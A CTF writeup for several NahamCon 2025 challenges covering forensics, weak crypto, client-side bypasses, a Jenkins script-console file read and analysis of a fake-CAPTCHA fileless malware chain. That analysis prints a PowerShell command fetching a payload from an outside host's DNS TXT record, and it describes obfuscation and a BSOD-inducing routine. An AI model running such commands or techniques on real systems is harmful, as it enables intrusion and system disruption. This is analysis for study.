# NahamCon 2025 CTF Writeup

Welcome to my CTF Writeup for challenges my team and I solved for the CTF competition.

In this file, I’ll walk through the challenges I solved during the event, providing insights into the tools, techniques, and vulnerabilities I encountered and how I approached solving each problem.

---

![NahamCert](https://github.com/user-attachments/assets/cfcdd41c-1f19-41de-bcf1-fab300f0d20a)

# Table of Contents
---

## Table of Contents
- [Challenge 1: Screenshot](#Challenge-1-Screenshot)
- [Challenge 2: Free Flags](#Challenge-2-Free-Flags)
- [Challenge 3: Naham-Commencement 2025](#Challenge-3-Naham-Commencement-2025)
- [Challenge 4: Cryptoclock](#Challenge-4-Cryptoclock)
- [Challenge 5: The Martian](#Challenge-5-The-Martian)
- [Challenge 6: Deflation Gangster](#Challenge-6-Deflation-Gangster)
- [Challenge 7: SNAD](#Challenge-7-SNAD)
- [Challenge 8: The Best Butler](#Challenge-8-The-Best-Butler)
- [Challenge 9: Clarification Verification (Fileless Malware)](#Challenge-9-Clarification-Verification-Fileless-Malware)

----
# Challenge 1: Screenshot

Author: @John Hammond  
  
Oh shoot! I accidentally took a screenshot just as I accidentally opened the dump of a `flag.zip` file in a text editor! Whoopsies, what a crazy accidental accident that just accidented!  
  
Well anyway, I think I remember the password was just **`password`**!

----

Examining the file type:
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# file Screenshot.png 
Screenshot.png: PNG image data, 1909 x 934, 8-bit/color RGBA, non-interlaced
```

Running strings against the file shows us 'IEND' at the end:
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─# strings Screenshot.png| tail 
G:yVRvo
Yx'	3
Ieo)
GU^m
Qc^C
;EgMy
uf?Ao
6f=N
;3668
IEND
```

![image](https://github.com/user-attachments/assets/a0799615-1f7d-481f-81f1-0849bb9a2e79)

Using the scan text utility on Windows we're able to copy the contents on the screen:
```txt
00000000: 504b 0304 3300 0100 6300 2f02 b55a 0000
00000010: 0000 4300 0000 2700 0000 0800 0b00 666c
00000020: 6167 2e74 7874 0199 0700 0200 4145 0300
00000030: 003d 42ff d1b3 5f95 0314 24f6 8b65 c3f5
00000040: 7669 f14e 8df0 003f e240 b3ac 3364 859e
00000050: 4c2d bc3c 36f2 d4ac c403 7613 85af e4e3
00000060: f90f bd29 d91b 614b a2c6 efde 11b7 1bcc
00000070: 907a 72ed 504b 0102 3f03 3300 0100 6300
00000080: 2f02 b55a 0000 0000 4300 0000 2700 0000
00000090: 0800 2f00 0000 0000 0000 2080 b481 0000
000000a0: 0000 666c 6167 2e74 7874 0a00 2000 0000
000000b0: 0000 0100 1800 8213 8543 07ca db01 0000
000000c0: 0000 0000 0000 0000 0000 0000 0000 0199
000000d0: 0700 0200 4145 0300 0050 4b05 0600 0000
000000e0: 0001 0001 0065 0000 0074 0000 0000 00

PK .. 3 ... c./ .. Z ..
.. C ... '.
ag. txt ..
.= B
vi.N ...?. @ .. 3d ..
L -.< 6.
... ) .. ak ..
.zr.PK ..?. 3 ... c.
/ .. Z.

.f1
.AE ..
.$ .. e ..

..

... C.

.flag. txt ..
.C.

AE

.. PK

.e ... t ..
```

We can create a txt file containing the hex bytes:
```bash
┌──(root㉿kali)-[/home/kali]
└─# cat hex.txt
504b 0304 3300 0100 6300 2f02 b55a 0000
0000 4300 0000 2700 0000 0800 0b00 666c
6167 2e74 7874 0199 0700 0200 4145 0300
003d 42ff d1b3 5f95 0314 24f6 8b65 c3f5
7669 f14e 8df0 003f e240 b3ac 3364 859e
4c2d bc3c 36f2 d4ac c403 7613 85af e4e3
f90f bd29 d91b 614b a2c6 efde 11b7 1bcc
907a 72ed 504b 0102 3f03 3300 0100 6300
2f02 b55a 0000 0000 4300 0000 2700 0000
0800 2f00 0000 0000 0000 2080 b481 0000
0000 666c 6167 2e74 7874 0a00 2000 0000
0000 0100 1800 8213 8543 07ca db01 0000
0000 0000 0000 0000 0000 0000 0000 0199
0700 0200 4145 0300 0050 4b05 0600 0000
0001 0001 0065 0000 0074 0000 0000 00
```

This Python script contains the hex data to reconstruct as the hidden zip file:
```python
#!/usr/bin/env python3

with open('hex.txt', 'r') as f:
    hexdata = f.read()
    hexdata = ''.join(hexdata.split())
with open('output.zip', 'wb') as f:
    f.write(bytes.fromhex(hexdata))
```

This creates a zip file:
```bash
┌──(root㉿kali)-[/home/kali]
└─# python3 hex.py  
ZIP file created: output.zip
```

It came out messed up and I had to repair it:
```bash
┌──(root㉿kali)-[/home/kali]
└─# zip -FF reconstructed.zip --out fixed.zip
Fix archive (-FF) - salvage what can
 Found end record (EOCDR) - says expect single disk archive
Scanning for entries...
 copying: flag.tx  (67 bytes)
EOCDR found ( 1    216)...
```

Then we can unzip this with 7z:
```bash
┌──(root㉿kali)-[/home/kali]
└─# 7z x output.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 239 bytes (1 KiB)

Extracting archive: output.zip
--
Path = output.zip
Type = zip
Physical Size = 239

    
Enter password (will not be echoed):
Everything is Ok

Size:       39
Compressed: 239
```

This is the flag:
```
┌──(root㉿kali)-[/home/kali]
└─# cat flag.txt      
flag{907e5bb257cd5fc818e88a13622f3d46}
```

# Challenge 2: Free Flags

Author: @John Hammond  
  
WOW!! Look at all these free flags!!  
  
But... wait a second... only one of them is right??  
  
**Download the file(s) below.**

**Attachments:**  [free_flags.txt](https://ctf.nahamcon.com/files/cba72d2c0e710d0a5d692e0f53d6c049/free_flags.txt?token=eyJ1c2VyX2lkIjoxMzAsInRlYW1faWQiOjEwMzMsImZpbGVfaWQiOjQyfQ.aDDMzQ.bBUurr4VEEWKj6udles_ofjNuec)

---

Looking at the file returned shows a bunch of flags. One of these is correct. We need to determine how to isolate the correct flag:
```
┌──(root㉿kali)-[/home/kali]
└─# head free_flags.txt 
flag{fdSedc8056871bd0de7bf32f40e26c70}  flag{94c67d7c1800bbe53c5f121b217b057O}  flag{40c243fG117bf6ba86069002fc5cc98a}  flag{e98bd0f840c7b29aSfc8a0a408535274}  flag{8bl32486f3d00918487b7fc2fa304d89}  flag{fe3g277549005a4a09bff6735607fa39}
flag{bSb5973d364a4b74747f0f5a4a0920f2}  flag{S68f15c0eef79d80faeba2ae7d357d20}  flag{G5ad0075e8d398e5a4a4894e0f605fa4}  flag{cSc20baca1c8411043936b901c82f2c6}  flag{3bb4e247266f601a22bd396f0767f14l}  flag{agb40dfbffd1ee14d09bf07df90c412e}
flag{2l83d36a434a6024c5360245659082d8}  flag{bbca8dgaf7bd8705c44eb6b34ea077ad}  flag{8298lf2ecd2e9b91b00bbbe0410581da}  flag{ae7Sd5c525e75395ad31df2207408822}  flag{cadcO0175bbf1e921dc92a0b2ad136c8}  flag{gb432f916418739a71b204a95b9f0b0a}
```

Using regular expressions we're able to isolate the correct flag:
```bash
┌──(root㉿kali)-[/home/kali]
└─# grep -oP 'flag\{[0-9a-f]{32}\}' free_flags.txt
flag{ae6b6fb0686ec594652afe9eb6088167}
```

# Challenge 3: Naham-Commencement 2025

Author: @HuskyHacks

Welcome, Naham-Hacker Class of 2025! This challenge is your official CTF opening ceremony. Enjoy the CTF, play fair, play smart, and get those flags! BEGIN! 📯

(True story: NahamSec originally contracted me to built the actual NahamCon site. I showed this to him as a prototype and he said "you know, let's actually move you to the CTF dev team...")

Press the Start button on the top-right to begin this challenge. 

----

We are presented with this page:

![image](https://github.com/user-attachments/assets/24475879-d3a6-4195-aa93-fb1f927ad55f)

When we view the page source we can see a JavaScript source that has interesting text:

![image](https://github.com/user-attachments/assets/6d0dca9a-c418-475a-bbd9-25aada7c0e20)

This script is storing the validation process for accepting a user or denying them, through functions that encrypt user inputs `a()` and `b()`. There is a presence of two ciphers, a Caesar cipher and a Vigenere cipher with a key of `nahamcon`:
```javascript
function a(t) {
    let r = '';
    for (let i = 0; i < t.length; i++) {
        const c = t[i];
        if (/[a-zA-Z]/.test(c)) {
            const d = c.charCodeAt(0);
            const o = (d >= 97) ? 97 : 65;
            const x = (d - o + 16) % 26 + o;
            r += String.fromCharCode(x);
        } else {
            r += c;
        }
    }
    return r;
}

function b(t, k) {
    let r = '';
    let j = 0;
    for (let i = 0; i < t.length; i++) {
        const c = t[i];
        if (/[a-zA-Z]/.test(c)) {
            const u = c === c.toUpperCase();
            const l = c.toLowerCase();
            const d = l.charCodeAt(0) - 97;
            const m = k[j % k.length].toLowerCase();
            const n = m.charCodeAt(0) - 97;
            const e = (d + n) % 26;
            let f = String.fromCharCode(e + 97);
            if (u) {
                f = f.toUpperCase();
            }
            r += f;
            j++;
        } else {
            r += c;
        }
    }
    return r;
}

function c(s) {
    return btoa(s);
}

document.addEventListener('DOMContentLoaded', function () {
    const x1 = "dqxqcius";
    const x2 = "YeaTtgUnzezBqiwa2025";
    const x3 = "ZHF4cWNpdXM=";
    const k = "nahamcon";


    const f = document.getElementById('loginForm');
    const u = document.getElementById('username');
    const p = document.getElementById('password');
    const s = document.getElementById('spinner');
    const d = document.getElementById('result');

    f.addEventListener('submit', function (e) {
        e.preventDefault();

        const q = u.value;
        const w = p.value;


        const q1 = a(q);

        const w1 = b(w, k);

        if (q1 !== x1 || w1 !== x2) {
            d.textContent = "Access denied. Client-side validation failed. Try again.";
            d.className = "error";
            d.style.display = "block";
            return;
        }

        s.style.display = "block";
        d.style.display = "none";

        const g = new FormData();
        g.append('username', q);
        g.append('password', w);

        fetch('/login', {
            method: 'POST',
            body: g
        })
            .then(h => h.json())
            .then(z => {
                s.style.display = "none";
                d.style.display = "block";

                if (z.success) {
                    console.log("🎉 Server authentication successful!");
                    d.innerHTML = `
                    <p>${z.message}</p>
                    <p class="flag">🙌🎉${z.flag}🎉🙌</p>
                `;
                    d.className = "success";
                } else {
                    console.log("❌ Server authentication failed");
                    d.textContent = z.message;
                    d.className = "error";
                }
            })
            .catch(err => {
                console.error("🚨 Network error:", err);
                s.style.display = "none";
                d.style.display = "block";
                d.textContent = "An error occurred while processing your request.";
                d.className = "error";
            });
    });

});
```

The critical validation occurs here, where we have some ciphered texts. It is important to read everything in order to capture the full scope, and AI tools are great for speeding this up:

![image](https://github.com/user-attachments/assets/9a801dc5-0326-491c-bf21-192e8e558768)

This script will reverse both the Caesar cipher and the Vigenère cipher:
```python
#!/usr/bin/env python3

def reverse_caesar(s, shift=16):
    result = ''
    for c in s:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            # Shift backward by 16
            pos = (ord(c) - base - shift) % 26
            result += chr(base + pos)
        else:
            result += c
    return result

username_enc = "dqxqcius"
username = reverse_caesar(username_enc)
print(username)  # prints the original username

def vigenere_decrypt(ciphertext, key):
    result = ''
    j = 0
    for c in ciphertext:
        if c.isalpha():
            u = c.isupper()
            l = c.lower()
            d = ord(l) - 97
            m = key[j % len(key)].lower()
            n = ord(m) - 97
            e = (d - n + 26) % 26
            f = chr(e + 97)
            if u:
                f = f.upper()
            result += f
            j += 1
        else:
            result += c
    return result

ciphertext = "YeaTtgUnzezBqiwa2025"
key = "nahamcon"
password = vigenere_decrypt(ciphertext, key)
print(password)
```

Using our scripts we receive the proper username and password combination:
```bash
┌──(root㉿kali)-[/home/kali]
└─# ./commence.py                
nahamsec
LetTheGamesBegin2025
```

![image](https://github.com/user-attachments/assets/580b2233-c6cd-4601-b1f9-27ac282653b4)

# Challenge 4: Cryptoclock

Author: @JohnHammond

Just imagine it, the Cryptoclock!! Just like you've seen in the movies, a magical power to be able to manipulate the world's numbers across time!!

Press the Start button on the top-right to begin this challenge.
Connect with:

nc challenge.nahamcon.com 31728

Please allow up to 30 seconds for the challenge to become available.
Attachments: 

---

We use Netcat to reach the generated server side and we receive a text-encryptor:
```bash
┌──(root㉿kali)-[/home/kali]
└─# nc challenge.nahamcon.com 31728
Welcome to Cryptoclock!
The encrypted flag is: e0f63c67482a739a60add9cf904f2a665e9f953905a0895ee5e88ca5037c276e544e8c197783
Enter text to encrypt (or 'quit' to exit):
test
Encrypted: f2ff2e74
```

We write a Python script to generate the random seed decrypt the XOR encoded flag provided by the server side:
```python
#!/usr/bin/env python3

import random
import binascii
import time

def encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(data, key))

def generate_key(length: int, seed: int) -> bytes:
    random.seed(seed)
    return bytes(random.randint(0, 255) for _ in range(length))

encrypted_flag_hex = "e0f63c67482a739a60add9cf904f2a665e9f953905a0895ee5e88ca5037c276e544e8c197783"
encrypted_flag = bytes.fromhex(encrypted_flag_hex)

# Adjust start and end times according to when you think the server sent the flag.
# For example, try seeds within the last hour:
end_time = int(time.time())
start_time = end_time - 3600

for seed in range(start_time, end_time + 1):
    key = generate_key(len(encrypted_flag), seed)
    decrypted = encrypt(encrypted_flag, key)
    # Check if decrypted looks like valid ASCII with flag pattern "flag{"...
    try:
        text = decrypted.decode()
        if text.startswith("flag{"):
            print(f"Seed: {seed} -> Flag: {text}")
            break
    except UnicodeDecodeError:
        continue
```

We can then capture the flag:
```bash
┌──(root㉿kali)-[/home/kali]
└─# ./test.py
Seed: 1748031088 -> Flag: flag{0e42ba180089ce6e3bb50e52587d3724}
```

# Challenge 5: The Martian

Author: @John Hammond

Wow, this file looks like it's from outta this world!

Download the file(s) below.
Attachments: 

----

I read the output of the provided file and in the end found:
```bash
�����{��ɽ�[`Sg7~&_5� ��rE8P������40��./alien.jpg0�O��./the-martian.jpg����./the_martian.jpg�}0��./extracted_flag.jpg�(<v�./mars.jpg    
```

There must be embedded files here.

I saw this when running head:
```bash
┌──(root㉿kali)-[/home/kali]
└─# head challenge.martian 
MAR1�.SHA384NahamCon CTFBZh91AY&SY�}ٖ␦���������������������������������������+�w������4��5O2��M���S10�S�lFF�O��&�i��&�6��A�d'���ژM=#�z�0h�S4Й(UU?ɠb���2=2Ɂ4�i<�
```

Running strings we get a more clear output:
```bash
MAR1
SHA384
NahamCon CTF
./alien.jpg
./the-martian.jpg
./the_martian.jpg
./extracted_flag.jpg
./mars.jpg
```

I tried making it executable and that failed.

I was able to extract something with binwalk:
```bash
┌──(root㉿kali)-[/home/kali]
└─# binwalk -e challenge.martian --run-as=root

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
52            0x34            bzip2 compressed data, block size = 900k
12511         0x30DF          bzip2 compressed data, block size = 900k
32896         0x8080          bzip2 compressed data, block size = 900k
38269         0x957D          bzip2 compressed data, block size = 900k
50728         0xC628          bzip2 compressed data, block size = 900k
```

Inside of the extracted directory we can see some files that exist:
```bash
┌──(root㉿kali)-[/home/kali/_challenge.martian.extracted]
└─# file *            
30DF: bzip2 compressed data, block size = 900k
34:   JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 968x118, components 3
957D: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 968x118, components 3
8080: bzip2 compressed data, block size = 900k
C628: bzip2 compressed data, block size = 900k
```

I changed one of these files to a `.jpg` and received a flag (file 34):

![image](https://github.com/user-attachments/assets/6d234188-982e-4393-bc39-774d7638f0de)

# Challenge 6: Deflation Gangster

Author: @Kkevsterrr

Like American Gangster, but for other stuff.

Download the file(s) below.
Attachments: 

---

Unzipping the files:
```bash
┌──(root㉿kali)-[/home/kali]
└─# unzip gangster.zip           
Archive:  gangster.zip
   creating: important_docs/
  inflating: important_docs/important_docs.lnk  
```

Visiting important docs we find malicious powershell:

![image](https://github.com/user-attachments/assets/02cc8ff6-a917-4a92-a14e-b3943fe59b63)

This is a powershell invocation script:
```powershell
powershell.exe -w 1 -c "
$name = 'important_docs';
$file = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *$name.zip).fullname;
$bytes=[System.IO.File]::ReadAllBytes($file);
$size = (0..($bytes.Length - 4) | Where-Object {
    $bytes[$_] -eq 0x55 -and $bytes[$_+1] -eq 0x55 -and $bytes[$_+2] -eq 0x55 -and $bytes[$_+3] -eq 0x55
})[0] + 4;
$length=53;
$chunk=$bytes[$size..($size+$length-1)];
$out = \"$Env:TEMP\$name.txt\";
[System.IO.File]::WriteAllBytes($out,$chunk);
Invoke-Item $out
"
```

### What does this PowerShell snippet do?

1. **Defines `$name = 'important_docs'`.**
    
2. **Searches recursively inside the user profile directory for a ZIP file matching `*important_docs.zip`.**
    
3. **Reads all bytes of this ZIP file.**
    
4. **Looks for a sequence of 4 bytes equal to `0x55 0x55 0x55 0x55` inside the byte array.**
    
5. **Calculates an offset `$size` based on that sequence.**
    
6. **Extracts 53 bytes starting at `$size`.**
    
7. **Writes those 53 bytes to a temporary file called `important_docs.txt` in the TEMP directory.**
    
8. **Opens (`Invoke-Item`) that file.**

---

I was able to get the flag for this one by running `strings gangster.zip` and seeing an encoded string:
```bash
┌──(root㉿kali)-[/home/kali/Gang]
└─# strings gangster.zip 
important_docs/PK
Z.EOH
important_docs/important_docs.lnk
~R;u:5
ZF/&
b"Bw
.lD=~
 t$1	
xYhH
PRzX
W.VE
`!&3
6<eEJ
Z<3u]
Z1WVW]w
u':h5E
'Pcrg
$)#|
OS8(
Ac<Q
5Lsu
_T/^V
%zgP
~j	=
HqGg
h\S{bi#
_H|>My
K]$q=
`NoI
u85pb
M{^x
;DEFGZmxhZ3thZjExNTBmMDdmOTAwODcyZTE2MmUyMzBkMGVmOGY5NH0K
important_docs/PK
Z.EOH
important_docs/important_docs.lnkPK
```

The flag:
```bash
┌──(root㉿kali)-[/home/kali]
└─# echo "ZmxhZ3thZjExNTBmMDdmOTAwODcyZTE2MmUyMzBkMGVmOGY5NH0K" | base64 -d
flag{af1150f07f900872e162e230d0ef8f94}
```
# Challenge 7: SNAD

Author: @HuskyHacks  
  
No, it's not a typo. It's not sand. It's SNAD. There's a difference!  
  
**Press the `Start` button on the top-right to begin this challenge.**

**Connect with:**  

- [http://challenge.nahamcon.com:31239](http://challenge.nahamcon.com:31239/)

---

This function, `forceSettleAllGrains()`, is designed to **automatically place and settle grains** at predefined target positions in a sand simulation environment. By injecting particles directly and ensuring they are correctly positioned, it bypasses manual placement errors and guarantees successful flag retrieval.

#### **Breaking Down the Code**

1. **Define Target Positions & Colors**
    
    - The function specifies **7 exact coordinates**, each with a designated **color hue**:
        
        - `(367, 238) → Red (0)`
            
        - `(412, 293) → Orange (40)`
            
        - `(291, 314) → Yellow (60)`
            
        - `(392, 362) → Green (120)`
            
        - `(454, 319) → Blue (240)`
            
        - `(349, 252) → Indigo (280)`
            
        - `(433, 301) → Violet (320)`
            
2. **Reset the Grid**
    
    - `particles.length = 0;` clears all existing grains.
        
    - `resetGrid();` resets the simulation, ensuring a fresh state.
        
3. **Inject Perfectly Positioned Grains**
    
    - Each grain is **manually injected** using `injectSand(x, y, colorHue)`, ensuring:
        
        - Correct **coordinates**
            
        - Correct **color matching**
            
        - Immediate **settlement** in place
            
4. **Trigger Flag Verification**
    
    - After injecting grains, `checkFlag()` is called with a slight delay (`setTimeout`), allowing particles to stabilize.
        
    - If conditions are met, the function proceeds to `retrieveFlag()`, revealing the **flag**.
        

#### **Why This Method Works**

- **Precision Placement:** Instead of relying on player interaction, grains are **placed programmatically**.
    
- **Eliminates Errors:** Ensures **no movement issues**, avoiding incorrect positions.
    
- **Bypasses User Input:** Normally, players would have to manually place grains, but this script handles it instantly.
    
- **Automated Flag Triggering:** Guarantees `checkFlag()` runs after placement, forcing validation.
    

#### **Takeaway**

This function

![image](https://github.com/user-attachments/assets/7a4eacdd-2845-40bc-854e-446fb3a336e8)


Our team member Bryan Bidleman was able to copy and paste this into chatGPT, the HTML source, in order to create a solution with chat GPT for attacking this endpoint:

![image](https://github.com/user-attachments/assets/ec835ec9-7429-4352-b7f3-75c3f75a7d9d)

The payload:
```javascript
(function forceSettleAllGrains() { const targets = [ { x: 367, y: 238, colorHue: 0 }, { x: 412, y: 293, colorHue: 40 }, { x: 291, y: 314, colorHue: 60 }, { x: 392, y: 362, colorHue: 120 }, { x: 454, y: 319, colorHue: 240 }, { x: 349, y: 252, colorHue: 280 }, { x: 433, y: 301, colorHue: 320 } ]; // Clear existing particles and grid particles.length = 0; resetGrid(); // Inject perfectly positioned and settled particles targets.forEach(({ x, y, colorHue }) => { injectSand(x, y, colorHue); }); console.log("✅ Settled grains injected at all target positions."); setTimeout(() => { checkFlag(); }, 200); })();
```


![image](https://github.com/user-attachments/assets/9dff97c9-c986-414f-ba9b-4d9a7a2261e5)

![image](https://github.com/user-attachments/assets/3a4faa8b-12ed-4788-9b68-bcc837debe71)

# Challenge 8: The Best Butler

Author: @Kkevsterrr  
  
Truly, he's the best butler - he might even be able to serve up a `/flag.txt`!  
  
**NOTE, this challenge might take a bit more time to start. The flag is located at the root of the filesystem (`/flag.txt`)**  
  
**Press the `Start` button on the top-right to begin this challenge.**



---


This challenge has you enter a Jenkins environment:

![image](https://github.com/user-attachments/assets/919e95db-f11f-4697-825d-c3a895e4f0ea)

There is a build setup already:

![image](https://github.com/user-attachments/assets/a0d5c859-8639-444c-8c12-e270b43ee024)

Click on configure:

![image](https://github.com/user-attachments/assets/c6852e22-8e55-4f33-96b4-00e42859c526)

The previous builds show that we're running as the user 'SYSTEM' when we build.

This means we likely have permissions to view `/flag.txt`:
```groovy
println new File("/flag.txt").text
```

Use this command in the script console.

We are able to retrieve the flag after running the command in the script console:

![image](https://github.com/user-attachments/assets/56e1c4b4-4bbf-458b-a77e-2319c05a42eb)

Flag:
```bash
flag{ab63a76362c3972ac83d5cb8830fdb51}
```

# Challenge 9: Clarification Verification (Fileless Malware)

Author: @resume

One of our users received an email asking them to provide extra verification to download a zip file, but they weren't expecting to receive any files.

Can you look into the verification link to see if it's...phishy?

NOTE, if you visit this link below and it does not respond, try to make a connection in a different way. The challenge is functional and you should get a response.

Captcha.zip

WARNING: Please examine this challenge inside of a virtual machine for your own security. Upon invocation there is a real possibility that your VM may crash. 

---


Clicking the link brings us to that page:

![image](https://github.com/user-attachments/assets/ba457be9-2560-4946-9c1a-5214ca72649d)

The captcha wants us to run the malware essentially, which is fileless:

![image](https://github.com/user-attachments/assets/7f405995-ba1a-47bc-b237-c511419cc328)

If you follow the FIRST instruction you will have the payload in our clipboard:

![image](https://github.com/user-attachments/assets/6fced76d-9a26-487f-a86b-46d78ad0a59a)

The functionality that confirms that statement is here in the source code of the website:

![image](https://github.com/user-attachments/assets/44eda3a9-0a43-447c-9989-269433876037)

This PowerShell command is designed to execute a potentially malicious payload by bypassing execution policies and fetching external content. It uses `Invoke-RestMethod (irm)` to download a script from `captcha.zip/verify`, which is then executed via `Invoke-Expression (iex)`. The `-NoProfile` and `-ExecutionPolicy Bypass` flags ensure that the command runs without system restrictions, making it a common technique in Capture The Flag (CTF) challenges for privilege escalation or malware delivery. The inclusion of a fake **reCAPTCHA verification message** suggests an attempt to obfuscate intent, potentially tricking users or automated defenses into perceiving the script as legitimate. This setup mimics real-world malware tactics used in phishing campaigns and automated exploitation frameworks.

Another interesting point, the domain name of the website it is fetching from is a `.zip` domain. That is not a zip file, it is a website.

We can open PowerShell in our windows  VM:

![image](https://github.com/user-attachments/assets/38a46bbd-1921-4b3d-83a7-558165dc1187)

We will run the command to output this way in order to see the response, removing the 'IEX' at the end so no expression is invoked (payload launched).

Running it will look like this (spot correction):

![image](https://github.com/user-attachments/assets/f667bb1c-c4aa-4e74-817f-e7f7aaeba382)

One of my peers mentioned to me there may be an OS detection parameter in place, which happened to be true. The malware detects the OS in order to decide if it returns benign or malware data.

On my host (where we have the IEX removed) I ran the command to see the following:

![image](https://github.com/user-attachments/assets/6806c09b-fba7-4ac3-ac19-3616812f414e)

This PowerShell script is designed to execute an obfuscated command by decoding a Base64 string and running it with elevated privileges. The encoded data is first decoded into a readable UTF-8 string, which likely contains another PowerShell command. The script then invokes the `Shell.Application` COM object to execute the decoded command with administrative rights, bypassing execution policy restrictions. This technique is used in fileless malware to evade detection while delivering a payload or performing system modifications.

There is an encoded string in base64 text, which we can decode:

![image](https://github.com/user-attachments/assets/0d1763c0-a914-48e4-843c-434aadb88dee)

This PowerShell command retrieves a malicious payload by resolving the TXT record of `5gmlw.pyrchdata.com`, extracting the encoded content, and decoding it using Base64. The decoded data is then converted into a readable UTF-8 string and executed via `Invoke-Expression (iex)`, allowing remote code execution without directly downloading a file. This technique is used in fileless malware leveraging DNS queries to evade traditional security defenses and avoid detection by antivirus software.

![image](https://github.com/user-attachments/assets/955b9aca-3e34-4a82-9117-d5a6f9fb1066)

So this is where we can see the output of the TXT record containing a base64 encoded payload to be decoded in the malware, in a next step.

We can use PowerShell in our Windows host safely by removing the IEX piece to run and output the results to a text file:
```powershell
echo ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Resolve-DnsName -Name 5gmlw.pyrchdata.com -Type TXT).Strings -join ''))) > payload.txt
```

This gives us the payload:

![image](https://github.com/user-attachments/assets/65b71411-2dd8-430f-a0ab-31cd263cdc33)

This PowerShell script is a **fileless malware loader** that decodes and decompresses a hidden payload stored as a Base64-encoded, Deflate-compressed string. It reconstructs the original PowerShell code in memory, then executes it dynamically using `Invoke-Expression` (`iex`), without writing anything to disk. This technique is commonly used to evade antivirus and detection tools, as the actual malicious logic remains obfuscated and is only revealed at runtime. The purpose of the script is likely to download or execute a second-stage payload, establish persistence, or connect to a command-and-control (C2) server.

![image](https://github.com/user-attachments/assets/1a40377d-c9da-441b-a125-a3ce9469f9fa)

By default, when calling `$ShellId` in PowerShell, it returns `Microsoft.PowerShell`, identifying the running shell environment. However, an obfuscation technique involves manipulating `$ShellId` by concatenating an additional `"X"` at the end—resulting in `Microsoft.PowerShellX`. This subtle transformation disguises the execution of `IEX` (Invoke-Expression) by indirectly constructing the command. Instead of explicitly calling `IEX`, attackers or CTF challenges use `$ShellId+'X'` to execute obfuscated scripts while bypassing simple string-based detection mechanisms. This technique leverages PowerShell's flexibility in string operations to evade traditional security measures.

So in order to run this command we need to remove the invoke expression:

![image](https://github.com/user-attachments/assets/0219d814-0839-4532-9e80-236b1cd23996)

So we run this on my host RECKLESSLY:

![image](https://github.com/user-attachments/assets/97aaed75-39a3-4194-bc72-ee402c3c98b6)

The result is:

![image](https://github.com/user-attachments/assets/8563ec50-62cc-4d96-a0c0-ac6eb8a08f89)

The provided PowerShell snippet is a highly obfuscated script crafted to conceal its true intent. It utilizes a combination of string reversal, Base64 encoding, and dynamic execution via `Invoke-Expression` (`IEX`) to reconstruct and execute a hidden payload at runtime. This technique is often employed to evade static detection by security tools and analysts. The script appears to construct executable code from an encoded and reversed string, likely representing additional malicious logic or a secondary payload.

However, the snippet seems either incomplete or intentionally malformed—attempts to decode the embedded string result in invalid or unreadable output. This may indicate missing data or the presence of additional encoding layers meant to frustrate reverse engineering efforts.

To neutralize the script’s runtime behavior for safe analysis, the most effective approach is to remove or comment out the final `Invoke-Expression` call. This step disables execution while preserving the script’s structure, allowing analysts to dissect its logic without triggering any potentially harmful actions.

Running the malware into a output file:

![image](https://github.com/user-attachments/assets/5dfeaad7-5cf2-4eaf-ac8f-a47ed1e11d18)

Same pattern in our payload 3 output:

![image](https://github.com/user-attachments/assets/66a4afc3-1887-4d3c-912b-2849c83439be)

This PowerShell script demonstrates a highly sophisticated level of obfuscation and functionality designed to evade detection and enable low-level system manipulation. It dynamically constructs C# code within the PowerShell runtime, compiling it in-memory using `Add-Type` and `System.CodeDom.Compiler.CompilerParameters`. The generated C# code imports critical native Windows API functions—`RtlAdjustPrivilege` and `NtRaiseHardError`—which are commonly abused by malware to adjust privileges and potentially crash or reboot the system, depending on the execution context and parameters.

The script utilizes complex string concatenation and replacements to obfuscate both the class and method names as well as encoded payloads. Toward the end, it decodes and executes a Base64-encoded command using `Invoke-Expression` (`IeX`). This encoded segment appears to call `.NET` environment methods to manipulate environmental variables, possibly as part of a persistence or anti-analysis strategy.

Overall, the script's intention seems to be to elevate privileges and disrupt system operation while hiding its true behavior through aggressive string manipulation and runtime code generation. Removing or commenting out the `IeX` execution line and intercepting the compilation and execution of the C# code would be critical for safely analyzing this script in a sandbox or controlled environment.

![image](https://github.com/user-attachments/assets/a3ccd6f7-ff07-4f69-89bc-87462ce88c8b)

Running the command:

![image](https://github.com/user-attachments/assets/578ae9a4-ec52-4ede-9b3c-44465c5898ac)

The result:

![image](https://github.com/user-attachments/assets/afb7fab3-1b04-4207-b8c6-5dc96a2d0c0c)

This PowerShell script dynamically compiles and runs C# code that calls two low-level Windows API functions from `ntdll.dll`: `RtlAdjustPrivilege` and `NtRaiseHardError`. The script first enables a special privilege (`SeShutdownPrivilege`) by calling `RtlAdjustPrivilege`, then triggers a critical system error with `NtRaiseHardError`, which can cause a Blue Screen of Death (BSOD) or system crash. After executing this, the script sets an environment variable named `flag` with a specific value in the current process. This technique is often used in malware or exploit code to escalate privileges and force a system failure.

Decoding the most stand-out base64 text gives us the flag:

![image](https://github.com/user-attachments/assets/68b8102f-a132-4db2-ad2a-d6c5c9c953ab)

I did this statically, but you also could have done this dynamically where you could run it and crash. Then you would be able to notice where the flag was embedded in your environment variables, via Process Monitor.

